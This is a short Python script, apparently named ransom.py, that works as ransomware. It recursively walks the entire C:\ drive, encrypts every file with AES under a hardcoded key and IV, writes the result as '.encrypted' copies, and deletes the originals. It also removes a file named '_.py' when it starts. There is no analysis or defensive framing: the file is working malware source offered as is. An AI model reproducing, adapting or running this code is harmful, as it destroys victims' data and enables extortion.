#ondisk
from Crypto.Cipher import AES
import os
import glob

try:
    os.remove("_.py")
except:
    pass

def pad(s):
    return s + b"\0" * (AES.block_size - len(s) % AES.block_size)


def encrypt(data,key=None):

    if key == None:
        key = "ascftrgtyhjuikhg".encode()
    iv = "jfhdgetdhsgethdg".encode()
    aes = AES.new(key, AES.MODE_CBC, iv)
    return aes.encrypt(pad(data))


def encrypt_files(dir,key=None):
    liste_dir = []
    for i in glob.glob(f"{dir}/*"):
        if os.path.isdir(i):
            liste_dir.append(i)
        else:
            if "ransom.py" in i or ".encrypted" in i:
                pass
            else:
                with open(i,'rb') as file:
                    with open(i+'.encrypted','wb') as file2:
                        if key == None:
                            file2.write(encrypt(file.read()))
                        else:
                            file2.write(encrypt(file.read(),key))
                os.remove(i)
    for i in liste_dir:
        encrypt_files(i)

encrypt_files("C:\\")
